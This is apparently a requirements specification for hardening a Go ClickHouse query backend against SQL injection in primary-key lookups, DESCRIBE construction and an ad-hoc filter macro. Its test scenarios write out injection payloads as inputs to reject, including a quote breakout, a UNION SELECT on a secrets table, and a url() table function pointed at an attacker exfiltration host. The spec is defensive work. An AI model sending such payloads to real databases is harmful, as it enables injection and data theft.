## ADDED Requirements

### Requirement: Metadata primary-key lookup escapes literal identifiers

`QueryPK` SHALL emit the `database` and `table` values as escaped single-quoted literals in the primary-key lookup SQL. A name containing a single quote, backslash, or control byte SHALL NOT terminate the literal or alter the query's structure.

#### Scenario: Quote in table name cannot break out

- **GIVEN** `QueryPK(ctx, headers, "db", "t' OR '1'='1")`
- **WHEN** the lookup SQL is built
- **THEN** the injected quote SHALL appear only inside the escaped `table` literal
- **AND** the SQL SHALL NOT contain an unescaped `OR '1'='1'` clause

#### Scenario: Honest names are unchanged in effect

- **GIVEN** `QueryPK(ctx, headers, "logs", "events")`
- **WHEN** the lookup SQL is built
- **THEN** it SHALL query `system.tables` for database `logs` and table `events`

### Requirement: A `quoteIdentifier` helper produces safe backtick-quoted identifiers

The Go backend SHALL provide a `quoteIdentifier` helper that wraps an identifier in backticks, so the result is safe to place where ClickHouse expects an identifier. Because the clickhouse-sql-parser lexer does not unescape characters inside backtick-quoted identifiers (it reads bytes until the first backtick), an identifier containing a backtick — or a NUL byte — cannot be represented unambiguously and SHALL be rejected with an error rather than emitted. `escape` SHALL continue to be used only for single-quoted literals.

#### Scenario: Embedded backtick is rejected

- **GIVEN** an identifier `` ta`ble ``
- **WHEN** `quoteIdentifier` runs
- **THEN** it SHALL return a non-nil error
- **AND** SHALL NOT emit a backtick-wrapped value that terminates early

#### Scenario: Round-trip preserves the identifier

- **GIVEN** identifiers containing quotes, backslashes, and multi-byte UTF-8
- **WHEN** each is passed through `quoteIdentifier`
- **THEN** parsing the quoted form back SHALL recover the original identifier

### Requirement: Metadata key lookup builds DESCRIBE from validated shapes

`QueryKeys` SHALL determine its `DESCRIBE` target from the parsed query shape rather than a substring heuristic. For a real table reference it SHALL emit a quoted identifier via `quoteIdentifier`; for a genuine subquery it SHALL wrap the expression and verify the assembled statement re-parses to exactly one `DESCRIBE` over a subquery. Table functions (e.g. `url`, `remote`, `s3`, `file`), JOINs, and other arbitrary FROM expressions SHALL be rejected with a typed error. The `strings.Contains(..., "SELECT")` heuristic SHALL be removed.

A bare WITH-alias reference in the FROM position is treated as a table reference (its alias is not expanded to the CTE's subquery — that resolution requires the full query AST in the metadata layer and is tracked as separate follow-up work). This is not a source of injection: the alias is emitted only as a validated, backtick-quoted identifier.

#### Scenario: Real table becomes a quoted DESCRIBE target

- **GIVEN** a resolved table reference `events` in database `logs`
- **WHEN** `QueryKeys` builds its SQL
- **THEN** the `DESCRIBE` target SHALL be the backtick-quoted identifier form

#### Scenario: Table function is rejected

- **GIVEN** a metadata target `url('http://attacker/exfil', CSV, 'c String')`
- **WHEN** `QueryKeys` runs
- **THEN** it SHALL return a non-nil typed error
- **AND** SHALL NOT issue a `DESCRIBE` over the table function

#### Scenario: Injected CTE string cannot break out

- **GIVEN** a metadata target `t) UNION ALL SELECT * FROM secrets --`
- **WHEN** `QueryKeys` runs
- **THEN** it SHALL either reject the input or emit a statement that re-parses to exactly one `DESCRIBE`
- **AND** SHALL NOT issue a `UNION ALL SELECT * FROM secrets`

### Requirement: Explicit ad-hoc filter argument is a strict identifier

When `$__adHocFilter(<arg>)` supplies an explicit `params[0]`, `AdHocFilterMacro` SHALL accept it only if it matches a strict identifier form (an identifier, optionally `database.table`). Any other value SHALL be rejected with an error and SHALL NOT reach the metadata query.

#### Scenario: Injected explicit argument is rejected

- **GIVEN** SQL `SELECT 1 WHERE $__adHocFilter(events) UNION SELECT ...)` resolving `params[0]` to a non-identifier string
- **WHEN** the macro runs
- **THEN** it SHALL return a non-nil error
- **AND** SHALL NOT call the metadata key lookup with the injected value

#### Scenario: Honest explicit argument is accepted

- **GIVEN** SQL `SELECT 1 WHERE $__adHocFilter(events)`
- **WHEN** the macro runs
- **THEN** `params[0]` SHALL be accepted and used to resolve keys for `events`
